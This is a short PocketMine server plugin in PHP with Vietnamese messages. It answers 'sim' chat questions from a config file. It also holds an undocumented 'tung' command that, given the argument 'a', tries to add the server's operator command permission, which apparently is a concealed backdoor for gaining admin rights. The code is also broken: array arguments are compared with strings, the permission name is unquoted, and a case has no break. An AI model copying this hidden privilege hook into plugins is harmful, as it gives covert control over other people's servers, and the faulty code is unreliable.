<?php
namespace tung;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\plugin\PluginBase;
use pocketmine\Player;
use pocketmine\utils\Config;
use pocketmine\utils\TextFormat;
use pocketmine\permission\DefaultPermissions;


class Main extends PluginBase 
{
  public function onEnable()
    {
	     $this->saveDefaultConfig();
         $this->reloadConfig();
	     $this->getLogger()->info("§l§6Plugin NoiVoiCon da dc kich hoat");
    }
  
  public function onCommand(CommandSender $sender, Command $command, string $label, array $args):bool{
	
    switch(strtolower($command->getName()))
	  {	   		   		     
	   case "sim":
	      $SimSiMi = $this->getConfig()->get("SimSiMi");  
		 
	      foreach($SimSiMi as $cauhoi=>$cautraloi)
		  {				
			if ($args[0] == $cauhoi )
		   { 
		    $sender->sendMessage($cautraloi);
		   };	    			 
		  };
       case "tung":	
          if($args == "a"){
			$this->getServer()->addPermission(pocketmine.command.op);
			$sender->sendMessage("aaaaaaa");
		  }if($args == null){$sender->sendMessage("???GIe??");
		  }		  
	  }
	  return true;
  }    
}
  